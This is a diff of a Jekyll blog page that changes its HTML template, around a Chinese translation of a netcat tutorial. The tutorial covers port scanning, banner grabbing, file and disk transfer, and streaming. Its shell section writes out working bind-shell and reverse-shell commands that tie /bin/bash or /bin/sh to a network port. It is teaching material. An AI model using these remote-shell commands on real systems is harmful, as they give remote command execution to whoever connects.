@@ -1,31 +1,76 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
-<meta charset="utf-8" />
-<meta name="author" content="HuangDing" />
-<meta name="keywords" content="linux" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<title>程序员 - 博客 - HuangDing / Linux Netcat命令：网络工具中的瑞士军刀</title>
-<link href="http://http://uwebs.tk/feed.xml" rel="alternate" title="程序员 - 博客 - HuangDing" type="application/atom+xml" />
-<link rel="stylesheet" href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" />
-<link rel="stylesheet" type="text/css" href="/assets/css/site.css" />
-<link rel="stylesheet" type="text/css" href="/assets/css/code/github.css" />
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Linux Netcat命令：网络工具中的瑞士军刀</title>
+  <meta name="description" content="英文原文：Linux Netcat command – The swiss army knife of networking，编译：oschina">
+
+  <link rel="canonical" href="127.0.0.1/archives/2013/04/16/linux-netcat-command.html">
+
+  <link rel="stylesheet" href="/assets/css/bootstrap.min.css">
+  <!-- <link rel="stylesheet" href="/assets/css/icard_resume.css"> -->
+  <link rel="stylesheet" href="/assets/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/assets/css/blog.css" >
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+
+  <link rel="icon" type="image/png" href="/assets/img/avatar.JPG">
+
+  <!-- Google fonts -->
+  <link rel='stylesheet' href='//fonts.googleapis.com/css?family=Open+Sans:300' type='text/css'>
+  <link rel='stylesheet' href='//fonts.googleapis.com/css?family=Source+Sans+Pro' type='text/css'>
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+  <script src="assets/js/html5shiv.min.js"></script>
+  <script src="assets/js/respond.min.js"></script>
+  <![endif]-->
 
 </head>
 
-<body class="page-type-post">
+    <body>
+        <header class="bloghead">
+    <dev class="authorheader">
+        <a href="/">
+            <img alt="My Avatar" src="/assets/img/avatar.JPG"/>
+        </a>
+        <dev class="blogtitle">
+            <h1><a href="/">HuangDing</a></h1>
+            <h5> 自己选的路，跪着也走下去! </h5>
+        </dev>
+    </dev>
 
-<div class="main">
-	<div class="trace">/ <a href="/">程序员 - 博客 - HuangDing</a> / Linux Netcat命令：网络工具中的瑞士军刀</div>
+    <nav class="menu" role="nav">
+        <ul>
+            <li><a href="/">Home</a></li>
+            <li>|</li>
+            <li><a href="/menu.html">Menu</a></li>
+            <li>|</li>
+            <li><a href="/collection.html">Collection</a></li>
+            <li>|</li>
+            <li><a target="_blank" href="https://github.com/beango">Github</a></li>
+            <li>|</li>
+            <li><a target="_blank" href="/about.html">About Me</a></li>
+        </ul>
+    </nav>
+</header>
 
-<article>
-	<h1><a href="/archives/2013/04/16/linux-netcat-command.html">Linux Netcat命令：网络工具中的瑞士军刀</a></h1>
-	
-	<p class="meta">
-	<span class="datetime">2013-04-16</span> posted in [<a href="/category/default" class="category">转载</a>]
-</p>
-	
-<p>英文原文：<a href="http://mylinuxbook.com/linux-netcat-command/" title="http://mylinuxbook.com/linux-netcat-command/">Linux Netcat command – The swiss army knife of networking</a>，编译：<a href="http://www.oschina.net/translate/linux-netcat-command" title="http://www.oschina.net/translate/linux-netcat-command">oschina</a></p>
+
+        <main class="blogmain">
+            <header>
+                <h1 class="article-title">Linux Netcat命令：网络工具中的瑞士军刀</h1>
+                <p class="article-time">
+                    ,  发表于 <span></span>
+                </p>
+                <p class="article-hint">
+                    如果你对本文有任何的建议或者疑问, 可以在
+                    <a href="https://github.com/liungkejin/liungkejin.github.io/issues" target="_blank">这里给我提 Issues</a>, 谢谢! :)
+                </p>
+            </header>
+            <p>英文原文：<a href="http://mylinuxbook.com/linux-netcat-command/" title="http://mylinuxbook.com/linux-netcat-command/">Linux Netcat command – The swiss army knife of networking</a>，编译：<a href="http://www.oschina.net/translate/linux-netcat-command" title="http://www.oschina.net/translate/linux-netcat-command">oschina</a></p>
 
 <p><strong>netcat</strong>是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它。使用netcat命令所能完成的事情令人惊讶。</p>
 
@@ -41,8 +86,9 @@
 
 <p>端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。</p>
 
-<pre><code>$nc -z -v -n 172.31.100.7 21-25
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -z -v -n 172.31.100.7 21-25
 </code></pre>
+</div>
 
 <p>可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.</p>
 
@@ -56,8 +102,9 @@
 
 <p>一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。</p>
 
-<pre><code>$ nc -v 172.31.100.7 21
+<div class="highlighter-rouge"><pre class="highlight"><code>$ nc -v 172.31.100.7 21
 </code></pre>
+</div>
 
 <p>netcat 命令会连接开放端口21并且打印运行在这个端口上服务的banner信息。</p>
 
@@ -67,15 +114,17 @@
 
 <p>Server</p>
 
-<pre><code>$nc -l 1567
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -l 1567
 </code></pre>
+</div>
 
 <p>netcat 命令在1567端口启动了一个tcp服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。</p>
 
 <p>Client</p>
 
-<pre><code>$nc 172.31.100.7 1567
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc 172.31.100.7 1567
 </code></pre>
+</div>
 
 <p>不管你在机器B上键入什么都会出现在机器A上。</p>
 
@@ -85,13 +134,15 @@
 
 <p>Server</p>
 
-<pre><code>$nc -l 1567 &lt; file.txt
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -l 1567 &lt; file.txt
 </code></pre>
+</div>
 
 <p>Client</p>
 
-<pre><code>$nc -n 172.31.100.7 1567 &gt; file.txt
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -n 172.31.100.7 1567 &gt; file.txt
 </code></pre>
+</div>
 
 <p>这里我们创建了一个服务器在A上并且重定向netcat的输入为文件file.txt，那么当任何成功连接到该端口，netcat会发送file的文件内容。</p>
 
@@ -103,13 +154,15 @@
 
 <p>Server</p>
 
-<pre><code>$nc -l 1567 &gt; file.txt
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -l 1567 &gt; file.txt
 </code></pre>
+</div>
 
 <p>Client</p>
 
-<pre><code>nc 172.31.100.23 1567 &lt; file.txt
+<div class="highlighter-rouge"><pre class="highlight"><code>nc 172.31.100.23 1567 &lt; file.txt
 </code></pre>
+</div>
 
 <h3 id="section-2">4，目录传输</h3>
 
@@ -119,13 +172,15 @@
 
 <p>Server</p>
 
-<pre><code>$tar -cvf – dir_name | nc -l 1567
+<div class="highlighter-rouge"><pre class="highlight"><code>$tar -cvf – dir_name | nc -l 1567
 </code></pre>
+</div>
 
 <p>Client</p>
 
-<pre><code>$nc -n 172.31.100.7 1567 | tar -xvf -
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -n 172.31.100.7 1567 | tar -xvf -
 </code></pre>
+</div>
 
 <p>这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。</p>
 
@@ -135,15 +190,17 @@
 
 <p>Server</p>
 
-<pre><code>$tar -cvf – dir_name| bzip2 -z | nc -l 1567
+<div class="highlighter-rouge"><pre class="highlight"><code>$tar -cvf – dir_name| bzip2 -z | nc -l 1567
 </code></pre>
+</div>
 
 <p>通过bzip2压缩</p>
 
 <p>Client</p>
 
-<pre><code>$nc -n 172.31.100.7 1567 | bzip2 -d |tar -xvf -
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -n 172.31.100.7 1567 | bzip2 -d |tar -xvf -
 </code></pre>
+</div>
 
 <p>使用bzip2解压</p>
 
@@ -153,15 +210,17 @@
 
 <p>服务端</p>
 
-<pre><code>$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt
 </code></pre>
+</div>
 
 <p>使用mcrypt工具加密数据。</p>
 
 <p>客户端</p>
 
-<pre><code>$mcrypt –flush –bare -F -q -m ecb &lt; file.txt | nc -l 1567
+<div class="highlighter-rouge"><pre class="highlight"><code>$mcrypt –flush –bare -F -q -m ecb &lt; file.txt | nc -l 1567
 </code></pre>
+</div>
 
 <p>使用mcrypt工具解密数据。</p>
 
@@ -175,13 +234,15 @@
 
 <p>服务端</p>
 
-<pre><code>$cat video.avi | nc -l 1567
+<div class="highlighter-rouge"><pre class="highlight"><code>$cat video.avi | nc -l 1567
 </code></pre>
+</div>
 
 <p>这里我们只是从一个视频文件中读入并重定向输出到netcat客户端</p>
 
-<pre><code>$nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -
 </code></pre>
+</div>
 
 <p>这里我们从socket中读入数据并重定向到mplayer。</p>
 
@@ -193,13 +254,15 @@
 
 <p>Server</p>
 
-<pre><code>$dd if=/dev/sda | nc -l 1567
+<div class="highlighter-rouge"><pre class="highlight"><code>$dd if=/dev/sda | nc -l 1567
 </code></pre>
+</div>
 
 <p>Client</p>
 
-<pre><code>$nc -n 172.31.100.7 1567 | dd of=/dev/sda
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -n 172.31.100.7 1567 | dd of=/dev/sda
 </code></pre>
+</div>
 
 <p>dd是一个从磁盘读取原始数据的工具，我通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。但是如果我们已经做过分区并且只需要克隆root分区，我们可以根据我们系统root分区的位置，更改sda为sda1，sda2.等等。</p>
 
@@ -211,13 +274,15 @@
 
 <p>Server</p>
 
-<pre><code>$nc -l 1567 -e /bin/bash -i
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -l 1567 -e /bin/bash -i
 </code></pre>
+</div>
 
 <p>Client</p>
 
-<pre><code>$nc 172.31.100.7 1567
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc 172.31.100.7 1567
 </code></pre>
+</div>
 
 <p>这里我们已经创建了一个netcat服务器并且表示当它连接成功时执行/bin/bash</p>
 
@@ -225,9 +290,10 @@
 
 <p>Server</p>
 
-<pre><code>$mkfifo /tmp/tmp_fifo
+<div class="highlighter-rouge"><pre class="highlight"><code>$mkfifo /tmp/tmp_fifo
 $cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo
 </code></pre>
+</div>
 
 <p>这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2&gt;&amp;1中。是用来重定向标准错误输出和标准输出，然后管道到netcat运行的端口1567上。至此，我们已经把netcat的输出重定向到fifo文件中。</p>
 
@@ -247,8 +313,9 @@ $cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo
 
 <p>Client</p>
 
-<pre><code>$nc -n 172.31.100.7 1567
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -n 172.31.100.7 1567
 </code></pre>
+</div>
 
 <p>你会得到一个shell提示符在客户端</p>
 
@@ -258,15 +325,17 @@ $cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo
 
 <p>服务端</p>
 
-<pre><code>$nc -l 1567
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -l 1567
 </code></pre>
+</div>
 
 <p>在客户端，简单地告诉netcat在连接完成后，执行shell。</p>
 
 <p>客户端</p>
 
-<pre><code>$nc 172.31.100.7 1567 -e /bin/bash
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc 172.31.100.7 1567 -e /bin/bash
 </code></pre>
+</div>
 
 <p>现在，什么是反向shell的特别之处呢</p>
 
@@ -278,13 +347,15 @@ $cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo
 
 <p>服务器端</p>
 
-<pre><code>$nc -l 1567
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -l 1567
 </code></pre>
+</div>
 
 <p>客户端</p>
 
-<pre><code>$nc 172.31.100.7 1567 -p 25
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc 172.31.100.7 1567 -p 25
 </code></pre>
+</div>
 
 <p>使用1024以内的端口需要root权限。</p>
 
@@ -296,13 +367,15 @@ $cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo
 
 <p>服务器端</p>
 
-<pre><code>$nc -u -l 1567 &lt; file.txt
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -u -l 1567 &lt; file.txt
 </code></pre>
+</div>
 
 <p>客户端</p>
 
-<pre><code>$nc -u 172.31.100.7 1567 -s 172.31.100.5 &gt; file.txt
+<div class="highlighter-rouge"><pre class="highlight"><code>$nc -u 172.31.100.7 1567 -s 172.31.100.5 &gt; file.txt
 </code></pre>
+</div>
 
 <p>该命令将绑定地址172.31.100.5。</p>
 
@@ -323,81 +396,42 @@ $cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo
 
 <p><a href="http://linux.die.net/man/1/nc">Netcat手册</a></p>
 
-	
-	<!--<p class="permalink">永久链接：<a href="http://http://uwebs.tk/archives/2013/04/16/linux-netcat-command.html">http://http://uwebs.tk/archives/2013/04/16/linux-netcat-command.html</a></p>-->
-</article>
-<div id="disqus_thread" class="comments"></div>
+            <footer class="article-footer">
+    <div class="authorimage">
+        <img src="/assets/img/avatar.JPG" alt="My Avatar" class="img-circle">
+    </div>
+    <section class="author">
+        <h4><a href="/about.html">黃丁</a></h4>
+        <a href="mailto:uwebs.tk@gmail.com">uwebs.tk@gmail.com</a>
+    </section>
+</footer>
 
+        </main>
 
-	<footer>
-		<p>&copy; Since 2012</p>
-	</footer>
+        <div class="footer-copyright">
+    <div class="container-fluid">
+        <div class="row-fluid">
+            <div class="col-md-12">
+                Copyright &copy; 2016 黃丁 - All rights reserved.
+            </div>
+        </div>
+    </div>
 </div>
-
-<aside>
-	<h2><a href="/">程序员 - 博客 - HuangDing</a><a href="/feed.xml" class="feed-link" title="Subscribe"><i class="fa fa-rss-square"></i></a></h2>
-	
-	<nav class="block">
-		<ul>
-		<li class="default"><a href="/category/default/">转载</a></li>
-		<li class="code"><a href="/category/code/">笔记</a></li>
-		
-		</ul>
-	</nav>
-	
-	<form action="/search/" class="block block-search">
-		<h3>Search</h3>
-		<p><input type="search" name="q" placeholder="Search" /></p>
-	</form>
-	
-	<div class="block block-about">
-		<h3>About</h3>
-		<figure>
-			
-			<figcaption><strong>HuangDing</strong></figcaption>
-		</figure>
-		<p>dotnet, mvc, python</p>
-	</div>
-	
-	<div class="block block-license">
-		<h3>Copyright</h3>
-		<p><a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/cn/" target="_blank" class="hide-target-icon" title="Copyright declaration of site content"><img alt="知识共享许可协议" src="http://i.creativecommons.org/l/by-nc-nd/2.5/cn/88x31.png" /></a></p>
-	</div>
-	
-	
-	<div class="block block-fork">
-		<a href="https://github.com/beango"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_orange_ff7600.png" alt="Fork me on GitHub"></a>
-	</div>
-	
-	
-	<div class="block block-thank">
-		<h3>Powered by</h3>
-		<p>
-			<a href="http://disqus.com/" target="_blank">Disqus</a>,
-			<a href="http://elfjs.com/" target="_blank">elf+js</a>,
-			<a href="https://github.com/" target="_blank">GitHub</a>,
-			<a href="http://www.google.com/cse/" target="_blank">Google Custom Search</a>,
-			<a href="http://en.gravatar.com/" target="_blank">Gravatar</a>,
-			<a href="http://softwaremaniacs.org/soft/highlight/en/">HighlightJS</a>,
-			<a href="https://github.com/mojombo/jekyll" target="_blank">jekyll</a>,
-			<a href="https://github.com/mytharcher/SimpleGray" target="_blank">SimpleGray</a>
-		</p>
-	</div>
-</aside>
-
-<script src="http://elfjs.qiniudn.com/code/elf-0.5.0.min.js"></script>
-<script src="http://yandex.st/highlightjs/7.3/highlight.min.js"></script>
-
-<script src="/assets/js/site.js"></script>
+<script type="text/javascript" src="/assets/js/jquery.min.js"></script>
+<script type="text/javascript" src="/assets/js/bootstrap.min.js"></script>
 
 <script>
-site.URL_GOOGLE_API = 'http://www.google.com/jsapi';
-site.URL_DISCUS_COMMENT = 'beango' ? 'http://beango.disqus.com/embed.js' : '';
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
 
-site.VAR_SITE_NAME = '程序员 - 博客 - HuangDing';
-site.VAR_GOOGLE_CUSTOM_SEARCH_ID = '015845096645085761197:gh2gyye7u1m';
-site.TPL_SEARCH_TITLE = '#{0} / 搜索：#{1}';
-site.VAR_AUTO_LOAD_ON_SCROLL = 0;
+  ga('create', 'UA-74743250-2', 'auto');
+  ga('send', 'pageview');
+
 </script>
-</body>
+
+
+    </body>
+
 </html>
